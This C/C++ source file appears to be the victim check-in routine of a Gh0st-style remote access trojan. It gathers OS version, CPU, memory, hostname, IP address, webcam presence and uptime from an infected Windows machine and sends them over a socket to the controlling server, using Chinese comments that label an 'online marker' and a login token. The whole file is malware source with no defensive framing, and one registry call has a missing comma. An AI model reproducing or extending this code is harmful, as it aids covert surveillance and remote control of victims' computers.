
#include <wininet.h>
#include <stdlib.h>
#include <vfw.h>
#include "until.h"

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "vfw32.lib")
typedef VOID (WINAPI *GlobalMemoryStatusT)
(
 LPMEMORYSTATUS lpBuffer
 );



typedef struct
{	
	BYTE			bToken;			// = 1
	OSVERSIONINFOEX	OsVerInfoEx;	// 版本信息
	WORD            CPUNums;        // CPU个数
	int				CPUClockMhz;	// CPU主频
	int             MemorySize;     // 内存大小
	IN_ADDR			IPAddress;		// 存储32位的IPv4的地址数据结构
	char			HostName[50];	// 主机名
	bool			bIsWebCam;		// 是否有摄像头
	DWORD			dwSpeed;		// 网速
	CHAR            szMark[100];    //上线标识
	char			RunTime[300];	// 运行时间
	//	int				nAnt;			//antiinfo
}LOGININFO;
// Get System Information
DWORD CPUClockMhz()
{
	HKEY	hKey;
	DWORD	dwCPUMhz;
	DWORD	dwBytes = sizeof(DWORD);
	DWORD	dwType = REG_DWORD;
	RegOpenKey(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", &hKey);
	RegQueryValueEx(hKey, "~MHz", NULL, &dwType, (PBYTE)&dwCPUMhz, &dwBytes);
	RegCloseKey(hKey);
	return	dwCPUMhz;
}

bool IsWebCam()
{
	bool	bRet = false;

	HMODULE mHodule = LoadLibrary("AVICAP32.dll");
	typedef BOOL (WINAPI *capGetDriverDescriptionT)(UINT,LPSTR,int,LPSTR,int);
	capGetDriverDescriptionT pcapGetDriverDescription=(capGetDriverDescriptionT)GetProcAddress(mHodule,"capGetDriverDescriptionA");

	char	lpszName[100], lpszVer[50];
	for (int i = 0; i < 10 && !bRet; i++)
	{
		bRet = pcapGetDriverDescription(i, lpszName, sizeof(lpszName),
			lpszVer, sizeof(lpszVer));
	}
	FreeLibrary(mHodule);
	return bRet;
}

int sendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed,LPSTR szMakr)
{
	int nRet = SOCKET_ERROR;
	// 登录信息
	LOGININFO	LoginInfo;
	// 开始构造数据
	LoginInfo.bToken = TOKEN_LOGIN; // 令牌为登录
	LoginInfo.bIsWebCam = 0; //没有摄像头
	LoginInfo.OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO *)&LoginInfo.OsVerInfoEx); // 注意转换类型
	
	strcpy(LoginInfo.szMark,szMakr);
	
	// 主机名
	char hostname[256]={NULL};
	DWORD hSize = 256;
	
	HKEY hkey;
	DWORD Operate = REG_CREATED_NEW_KEY;
	RegCreateKeyEx(HKEY_CURRENT_USER,"NetSubKey",NULL,NULL,NULL
		REG_OPTION_VOLATILE,KEY_QUERY_VALUE,NULL,&hkey,&Operate);

	DWORD lpType =  REG_SZ;
	if(RegQueryValueEx(hkey,"",NULL,&lpType,(LPBYTE)hostname,&hSize)==ERROR_SUCCESS)
		RegCloseKey(hkey);
	else

		GetComputerName(hostname,&hSize);

	// 连接的IP地址
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	getsockname(pClient->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);


	memcpy(&LoginInfo.IPAddress, (void *)&sockAddr.sin_addr, sizeof(IN_ADDR));
	memcpy(&LoginInfo.HostName, hostname, sizeof(LoginInfo.HostName));
	// CPU
	SYSTEM_INFO siSysInfo; 
	::GetSystemInfo(&siSysInfo);   
	LoginInfo.CPUNums = siSysInfo.dwNumberOfProcessors;
	LoginInfo.CPUClockMhz = CPUClockMhz();
	
	MEMORYSTATUS mem;
	mem.dwLength=sizeof(mem);
GlobalMemoryStatusT pGlobalMemoryStatus= (GlobalMemoryStatusT)GetProcAddress(LoadLibrary("kernel32.dll"),"GlobalMemoryStatus");
	pGlobalMemoryStatus(&mem);
	LoginInfo.MemorySize = mem.dwTotalPhys/1024/1024+1;
	LoginInfo.bIsWebCam = IsWebCam();
	
	// Speed
	LoginInfo.dwSpeed = dwSpeed;

	//  运行时间
	long t=GetTickCount();
	char day[100];
	char hour[100];
	char min[100];
	char time[300];
	wsprintf(day, "%d", t/86400000);
	t%=86400000;
	wsprintf(hour, "%d", t/3600000);
	t%=3600000;
	wsprintf(min, "%d", t/60000);
	wsprintf(LoginInfo.RunTime, "%s天%s小时%s分钟", day, hour, min);
	//wsprintf(LoginInfo.RunTime, "%s天", day, hour, min);

	nRet = pClient->Send((LPBYTE)&LoginInfo, sizeof(LOGININFO));
	
	return nRet;
}
